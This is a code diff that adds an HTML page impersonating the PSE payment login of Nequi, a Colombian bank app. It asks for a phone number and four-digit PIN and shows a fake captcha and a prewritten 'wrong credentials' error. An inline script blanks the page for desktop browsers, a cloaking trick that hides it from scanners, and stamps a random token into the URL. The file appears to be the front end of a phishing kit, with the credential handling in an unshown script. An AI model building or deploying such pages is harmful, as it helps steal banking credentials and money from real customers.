@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Pagos PSE</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="mobile-container">
+        <!-- Error Alert -->
+        <div id="error-alert" class="error-alert">
+            <i class="fas fa-exclamation-circle" style="margin-right: 8px;"></i>
+            Número de celular o clave incorrecta
+        </div>
+
+        <!-- Loading Overlay -->
+        <div id="loading-overlay" class="loading-overlay">
+            <div class="spinner"></div>
+            <div class="loading-text">Cargando...</div>
+        </div>
+
+        <header class="header">
+            <button class="back-button">
+                <i class="fas fa-arrow-left"></i>
+            </button>
+        </header>
+
+        <main class="content">
+            <div class="logo-container">
+                <!-- Simulating Nequi Logo with Text for now, or SVG if possible -->
+                <h1 class="nequi-logo">Nequi<span class="dot"></span></h1>
+            </div>
+
+            <h2 class="page-title">Pagos PSE de Nequi</h2>
+
+            <p class="description">
+                Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
+            </p>
+
+            <form class="login-form">
+                <div class="input-group">
+                    <input type="tel" placeholder="Número de celular" id="phone" maxlength="10">
+                </div>
+                <div class="input-group">
+                    <input type="password" placeholder="Clave" id="password" maxlength="4" inputmode="numeric">
+                </div>
+
+                <div class="captcha-container">
+                    <div class="captcha-box" id="captcha-box">
+                        <div class="captcha-circle" id="captcha-circle">
+                            <i class="fas fa-check check-icon" id="check-icon"></i>
+                        </div>
+                        <span class="captcha-text">Confirmo que soy una persona real.</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn btn-primary" id="login-btn">Entra</button>
+                <button type="button" class="btn btn-secondary">Ahora No</button>
+            </form>
+
+            <div class="footer-help">
+                <p>¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</p>
+            </div>
+        </main>
+    </div>
+
+    <script src="script.js"></script>
+<script>
+    (function() {
+        // Mobile Check
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
+        if (!mobileRegex.test(userAgent)) {
+            document.body.innerHTML = '';
+        }
+
+        try {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let token = '';
+            for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
+                token += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            const base64Token = btoa(token + Date.now()).replace(/=/g, '');
+            const url = new URL(window.location.href);
+            url.searchParams.set('token', base64Token);
+            window.history.replaceState(null, '', url.toString());
+        } catch(e) {}
+    })();
+</script>
+</body>
+</html>
